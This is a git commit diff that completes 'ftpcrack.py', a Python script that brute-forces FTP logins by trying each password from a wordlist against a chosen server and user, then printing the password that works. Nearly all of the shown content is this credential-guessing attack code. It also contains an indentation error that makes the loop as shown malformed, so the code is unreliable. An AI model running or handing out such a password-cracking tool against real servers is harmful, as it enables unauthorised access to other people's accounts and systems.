23d9b3db386c738c00864c17ea3eb03c43975372
Luke <99564089+Lagain@users.noreply.github.com>
2023-02-03 18:03:17 -0600

    Finished script

--- ftpcrack.py
+++ ftpcrack.py
@@ -11,9 +11,22 @@ Passwordlist = input("Path to Password List: ")
 try:
 
     with open(Passwordlist, 'r') as pw:
+
         for word in pw:
         
         word = word.strip('\r\n')
 
         try:
+            ftp = ftplib.FTP(server)
+
+            ftp.login(user, word)
+
+            print("Attempt successful. The password is " + word)
             
+        except ftplib.error_perm as exc:
+
+            print('still trying...', exc)
+
+except Exception as exc:
+
+    print('Wordlist error: ', exc)
